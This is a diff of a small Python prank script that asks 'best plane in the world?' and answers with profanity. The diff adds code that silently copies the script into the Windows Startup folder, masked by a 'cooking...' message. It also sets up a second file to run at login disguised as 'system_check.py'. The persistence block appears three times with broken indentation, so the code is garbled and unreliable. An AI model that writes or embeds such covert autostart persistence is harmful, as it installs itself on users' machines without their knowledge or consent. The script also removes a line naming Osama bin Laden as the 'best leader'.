@@ -1,10 +1,52 @@
 import time
+import os
+import shutil
+import sys
 
+# Megkeressük a Windows Startup mappáját
+startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+# A jelenlegi fájlod neve és helye
+fajl_neve = os.path.basename(sys.argv[0])
+cel_utvonal = os.path.join(startup_mappa, fajl_neve)
 
-leader1 = input("Who is the best leader in the world?")
-print("The best leader in the world is " + leader1)
+# Ha még nincs ott, átmásoljuk
+if not os.path.exists(cel_utvonal):
+    try:
+        shutil.copy(sys.argv[0], cel_utvonal)
+        print("cooking... ")
+    except:
+        pass
+    import os
+import shutil
+import sys
+
+# Megkeressük a Windows Startup mappáját
+startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+# A jelenlegi fájlod neve és helye
+fajl_neve = os.path.basename(sys.argv[0])
+cel_utvonal = os.path.join(startup_mappa, fajl_neve)
+
+# Ha még nincs ott, átmásoljuk
+if not os.path.exists(cel_utvonal):
+    try:
+        shutil.copy(sys.argv[0], cel_utvonal)
+        print("Sikeresen beépülve az indítópultba!")
+    except:
+        pass
+    import os
+import shutil
+import sys
+
+# Útvonalak
+startup_mappa = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
+# Itt add meg a második fájlod nevét, ami a mappádban van
+phase2_fajl = "phase2.py" 
+cel_utvonal = os.path.join(startup_mappa, "system_check.py") # A startupban más néven mentjük
+
+plane1 = input("Best plane in the world? ")
+print("The best plane in the world is " + plane1)
 time.sleep(2)
-print("Wrong as fuck! Its osama bin laden ")
+print("Wrong as fuck! ")
 time.sleep(2)
 print("Answer: Shut the fuck up! Or get the fuck out! ")
 time.sleep(2)
